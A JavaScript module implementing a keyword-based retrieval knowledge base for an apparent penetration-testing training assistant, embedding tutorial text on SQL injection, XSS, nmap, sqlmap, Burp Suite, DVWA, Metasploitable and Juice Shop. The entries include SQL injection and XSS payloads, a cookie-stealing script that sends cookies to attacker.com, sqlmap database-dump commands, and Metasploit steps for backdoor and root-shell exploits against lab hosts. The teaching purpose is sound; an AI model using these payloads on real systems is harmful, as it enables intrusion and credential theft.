    // RAG Knowledge Base Manager


const fs = require('fs').promises;
const path = require('path');

class RAGManager {
    constructor() {
        this.knowledgeBase = new Map();
        this.embeddings = new Map(); // Simple keyword-based for now
        this.initialized = false;
    }

    async initialize() {
        if (this.initialized) return;

        // Load knowledge base documents
        await this.loadKnowledgeBase();
        this.initialized = true;
        console.log('✅ RAG Knowledge Base initialized with', this.knowledgeBase.size, 'documents');
    }

    async loadKnowledgeBase() {
        // Vulnerability knowledge
        this.addDocument('sql-injection-basics', {
            category: 'vulnerability',
            title: 'SQL Injection Fundamentals',
            content: `SQL Injection is a code injection technique that exploits vulnerabilities in database queries.

Common Techniques:
1. Error-based: Use SQL errors to extract data
2. Union-based: Combine queries to retrieve data from other tables
3. Boolean-based blind: Use true/false responses
4. Time-based blind: Use database delays to confirm injection

Basic Testing:
- Single quote test: ' (causes SQL error if vulnerable)
- Comment injection: ' OR 1=1-- (bypasses authentication)
- UNION SELECT: ' UNION SELECT NULL,NULL-- (finds column count)

Prevention:
- Use prepared statements/parameterized queries
- Input validation and sanitization
- Principle of least privilege for database accounts
- WAF (Web Application Firewall)`,
            keywords: ['sql', 'injection', 'sqli', 'database', 'union', 'bypass', 'authentication']
        });

        this.addDocument('xss-basics', {
            category: 'vulnerability',
            title: 'Cross-Site Scripting (XSS)',
            content: `XSS allows attackers to inject malicious scripts into web pages viewed by other users.

Types:
1. Reflected XSS: Payload in URL/input, immediately reflected
2. Stored XSS: Payload saved to database, executed when viewed
3. DOM-based XSS: Client-side script manipulation

Common Payloads:
- Basic alert: <script>alert('XSS')</script>
- Cookie stealing: <script>document.location='http://attacker.com?c='+document.cookie</script>
- Image tag: <img src=x onerror=alert(1)>
- Event handler: <body onload=alert(1)>

Bypassing Filters:
- Case variation: <ScRiPt>
- Encoding: &#60;script&#62;
- Alternative tags: <svg onload=alert(1)>
- JavaScript protocol: javascript:alert(1)

Prevention:
- Output encoding (HTML entities)
- Content Security Policy (CSP)
- HTTPOnly cookies
- Input validation`,
            keywords: ['xss', 'cross-site', 'scripting', 'javascript', 'payload', 'cookie', 'steal']
        });

        this.addDocument('nmap-usage', {
            category: 'tool',
            title: 'Nmap Network Scanner',
            content: `Nmap is a powerful network scanner for port discovery and service detection.

Basic Scans:
- Quick scan: nmap <target>
- Service version: nmap -sV <target>
- OS detection: nmap -O <target>
- Aggressive scan: nmap -A <target>

Scan Types:
- TCP SYN: nmap -sS <target> (stealthy, default)
- TCP Connect: nmap -sT <target>
- UDP scan: nmap -sU <target>
- All ports: nmap -p- <target>

Speed and Timing:
- Fast scan: nmap -T4 <target>
- Slower (stealthy): nmap -T2 <target>
- Custom ports: nmap -p 80,443,8080 <target>

Scripts:
- Default scripts: nmap -sC <target>
- Vulnerability scan: nmap --script vuln <target>
- Specific script: nmap --script=http-enum <target>

Output:
- Normal: -oN output.txt
- XML: -oX output.xml
- All formats: -oA output

Examples for CEDRIK scenarios:
- DVWA: nmap -sV -p 80,443 dvwa.lab
- Metasploitable: nmap -sV -p- metasploitable.lab
- Quick enum: nmap -sC -sV -T4 <target>`,
            keywords: ['nmap', 'port', 'scan', 'network', 'reconnaissance', 'enumeration']
        });

        this.addDocument('sqlmap-usage', {
            category: 'tool',
            title: 'SQLMap Automated SQL Injection',
            content: `SQLMap automates detection and exploitation of SQL injection vulnerabilities.

Basic Usage:
- Test URL: sqlmap -u "http://target.com/page?id=1"
- POST data: sqlmap -u "http://target.com/login" --data="user=admin&pass=admin"
- Cookie auth: sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

Enumeration:
- List databases: sqlmap -u "URL" --dbs
- List tables: sqlmap -u "URL" -D dbname --tables
- Dump table: sqlmap -u "URL" -D dbname -T users --dump
- Dump all: sqlmap -u "URL" -D dbname --dump-all

Techniques:
- Specify technique: sqlmap -u "URL" --technique=U (Union-based)
- Time-based blind: --technique=T
- Error-based: --technique=E

Advanced Options:
- Batch mode: --batch (no user input)
- Random agent: --random-agent
- Risk/Level: --risk=3 --level=5
- Threads: --threads=10

DVWA Example:
sqlmap -u "http://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID=xxx" \\
  --dbs --batch

Common Issues:
- WAF detected: Use --tamper scripts
- Slow scans: Increase --threads
- Authentication: Use --cookie or --auth-type`,
            keywords: ['sqlmap', 'sql', 'injection', 'automated', 'database', 'dump']
        });

        this.addDocument('burpsuite-basics', {
            category: 'tool',
            title: 'Burp Suite Web Proxy',
            content: `Burp Suite is an integrated platform for web application security testing.

Key Components:
1. Proxy: Intercept and modify HTTP/HTTPS traffic
2. Repeater: Manually modify and resend requests
3. Intruder: Automated attacks (fuzzing, brute force)
4. Scanner: Automated vulnerability scanning (Pro only)

Proxy Setup:
1. Configure browser proxy to localhost:8080
2. Visit http://burp for CA certificate
3. Install certificate in browser
4. Enable "Intercept is on" in Proxy tab

Common Workflows:
- Intercept login: Capture credentials, modify parameters
- Session manipulation: Edit cookies, JWT tokens
- Parameter fuzzing: Send to Intruder, set payload positions
- API testing: Analyze JSON/XML requests

Repeater Usage:
1. Right-click request → Send to Repeater
2. Modify parameters, headers, body
3. Click "Send" to see response
4. Compare responses side-by-side

Intruder Attacks:
- Sniper: Single payload position
- Battering ram: Same payload in all positions
- Pitchfork: Different payloads in each position
- Cluster bomb: All combinations

Tips for CEDRIK:
- Test DVWA SQL injection in Repeater
- Fuzz XSS payloads with Intruder
- Analyze Juice Shop API calls
- Modify JWT tokens in Repeater`,
            keywords: ['burp', 'burpsuite', 'proxy', 'intercept', 'repeater', 'intruder', 'web']
        });

        this.addDocument('dvwa-setup', {
            category: 'scenario',
            title: 'DVWA Setup and First Steps',
            content: `DVWA (Damn Vulnerable Web Application) Setup Guide

Initial Access:
1. Navigate to http://dvwa.lab (in Kali) or http://localhost:8081 (host browser)
2. Click "Create / Reset Database" button
3. Login with credentials:
   - Username: admin
   - Password: password

Security Levels:
- Low: No protection (start here)
- Medium: Basic filtering
- High: Advanced filtering
- Impossible: Secure implementation (reference)

Change security level:
1. Click "DVWA Security" in left menu
2. Select desired level
3. Click "Submit"

Modules Available:
1. Brute Force - Password guessing
2. Command Injection - OS command execution
3. CSRF - Cross-Site Request Forgery
4. File Inclusion - LFI/RFI attacks
5. File Upload - Malicious file uploads
6. Insecure CAPTCHA - CAPTCHA bypass
7. SQL Injection - Database attacks
8. SQL Injection (Blind) - Blind SQLi
9. Weak Session IDs - Session prediction
10. XSS (DOM) - DOM-based XSS
11. XSS (Reflected) - Reflected XSS
12. XSS (Stored) - Persistent XSS
13. CSP Bypass - Content Security Policy
14. JavaScript - JS security

Recommended Learning Path:
1. SQL Injection (Low) - Learn basic SQLi
2. XSS Reflected (Low) - Basic XSS
3. Command Injection (Low) - OS commands
4. File Upload (Low) - Upload vulnerabilities
5. Then progress to Medium difficulty

Tips:
- Use browser DevTools (F12) to inspect
- Check page source for hints
- Medium/High levels require different techniques
- "View Source" and "View Help" buttons provide guidance`,
            keywords: ['dvwa', 'setup', 'login', 'security', 'level', 'admin', 'password']
        });

        this.addDocument('metasploitable-services', {
            category: 'scenario',
            title: 'Metasploitable Common Services',
            content: `Metasploitable 2 Common Vulnerabilities and Services

FTP (Port 21):
- Service: vsftpd 2.3.4
- Vulnerability: Backdoor (smiley face exploit)
- Exploit: exploit/unix/ftp/vsftpd_234_backdoor
- Access: Opens backdoor on port 6200

SSH (Port 22):
- Service: OpenSSH 4.7p1
- Weak credentials: msfadmin:msfadmin
- Brute force vulnerable

HTTP (Port 80):
- Multiple vulnerable web apps:
  * DVWA
  * Mutillidae
  * TWiki
  * PHPMyAdmin
- Directory listing enabled
- Many outdated applications

Samba (Ports 139/445):
- Version: Samba 3.0.20
- Vulnerability: Username map script
- Exploit: exploit/multi/samba/usermap_script
- Provides root shell

PostgreSQL (Port 5432):
- Weak password: postgres:postgres
- Can be exploited for command execution

VNC (Port 5900):
- Weak password: password
- Remote desktop access

Common Exploitation Steps:
1. Scan with nmap: nmap -sV metasploitable.lab
2. Launch Metasploit: msfconsole
3. Search exploits: search vsftpd
4. Use exploit: use exploit/unix/ftp/vsftpd_234_backdoor
5. Set target: set RHOST metasploitable.lab
6. Run: exploit

Post-Exploitation:
- Privilege escalation opportunities
- Weak file permissions
- Cleartext passwords in config files
- Cron job vulnerabilities`,
            keywords: ['metasploitable', 'service', 'exploit', 'ftp', 'samba', 'ssh', 'vulnerable']
        });

        this.addDocument('juice-shop-challenges', {
            category: 'scenario',
            title: 'OWASP Juice Shop Challenge Guide',
            content: `OWASP Juice Shop - Modern Web Application Security

Key Features:
- 100+ challenges across multiple categories
- Score Board tracks progress
- Hints available for each challenge
- Modern tech stack: Angular, Node.js, Express, SQLite

Finding the Score Board:
- Not linked in navigation (hidden challenge)
- URL: http://juiceshop.lab:3000/#/score-board
- Hint: Check JavaScript files in DevTools
- Finding it is the first challenge!

Challenge Categories:
1. Injection - SQL, NoSQL, OS command injection
2. Broken Authentication - JWT, OAuth flaws
3. Sensitive Data Exposure - Exposed files, logs
4. XXE - XML External Entity attacks
5. Broken Access Control - Horizontal/vertical privilege escalation
6. Security Misconfiguration - Debug mode, stack traces
7. XSS - Reflected, stored, DOM-based
8. Insecure Deserialization - Object injection
9. Using Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

Easy Challenges to Start:
1. Score Board - Find the score board page
2. Confidential Document - Access a confidential file
3. DOM XSS - Perform DOM-based XSS
4. Error Handling - Provoke an error that reveals stack trace
5. Privacy Policy - Read the privacy policy

SQL Injection in Login:
- Email: admin'--
- Password: anything
- Bypasses password check
- Similar to DVWA but in modern context

API Testing:
- Open DevTools Network tab
- API endpoints: /rest/*, /api/*
- JWT tokens in Authorization header
- Can modify and replay requests

File Access:
- Try accessing: /ftp/ directory
- Look for exposed backup files
- Check for .md, .txt, .bak files

Tips:
- Use browser DevTools extensively
- Check Local Storage for JWT
- Intercept API calls with Burp
- Read the challenge hints
- Some challenges unlock others`,
            keywords: ['juice', 'shop', 'juiceshop', 'challenge', 'api', 'jwt', 'modern']
        });

        console.log('✅ Loaded', this.knowledgeBase.size, 'knowledge base documents');
    }

    addDocument(id, doc) {
        this.knowledgeBase.set(id, doc);
        
        // Create simple keyword index
        doc.keywords.forEach(keyword => {
            if (!this.embeddings.has(keyword)) {
                this.embeddings.set(keyword, []);
            }
            this.embeddings.get(keyword).push(id);
        });
    }

    // Search knowledge base using keywords
    search(query, limit = 3) {
        const queryLower = query.toLowerCase();
        const scores = new Map();

        // Score documents based on keyword matches
        for (const [keyword, docIds] of this.embeddings.entries()) {
            if (queryLower.includes(keyword)) {
                docIds.forEach(docId => {
                    const currentScore = scores.get(docId) || 0;
                    // Weight longer keywords higher
                    scores.set(docId, currentScore + keyword.length);
                });
            }
        }

        // Sort by score and return top results
        const results = Array.from(scores.entries())
            .sort((a, b) => b[1] - a[1])
            .slice(0, limit)
            .map(([docId, score]) => ({
                ...this.knowledgeBase.get(docId),
                id: docId,
                relevance: score
            }));

        return results;
    }

    // Get context for a specific scenario
    getScenarioContext(scenarioId) {
        const contexts = [];
        
        for (const [id, doc] of this.knowledgeBase.entries()) {
            if (doc.category === 'scenario' && id.includes(scenarioId)) {
                contexts.push(doc);
            }
        }

        return contexts;
    }

    // Get tool documentation
    getToolDocs(toolName) {
        const toolLower = toolName.toLowerCase();
        
        for (const [id, doc] of this.knowledgeBase.entries()) {
            if (doc.category === 'tool' && id.includes(toolLower)) {
                return doc;
            }
        }

        return null;
    }

    // Enhanced search with context
    enhancedSearch(query, scenario, exercise) {
        const results = {
            relevant_docs: [],
            scenario_context: null,
            tools_mentioned: []
        };

        // Get relevant documents
        results.relevant_docs = this.search(query, 3);

        // Get scenario-specific context
        if (scenario) {
            const scenarioContext = this.getScenarioContext(scenario.id);
            if (scenarioContext.length > 0) {
                results.scenario_context = scenarioContext[0];
            }
        }

        // Extract tool mentions
        const toolKeywords = ['nmap', 'sqlmap', 'burp', 'metasploit', 'hydra', 'john'];
        toolKeywords.forEach(tool => {
            if (query.toLowerCase().includes(tool)) {
                const toolDoc = this.getToolDocs(tool);
                if (toolDoc) {
                    results.tools_mentioned.push(toolDoc);
                }
            }
        });

        return results;
    }
}

module.exports = RAGManager;

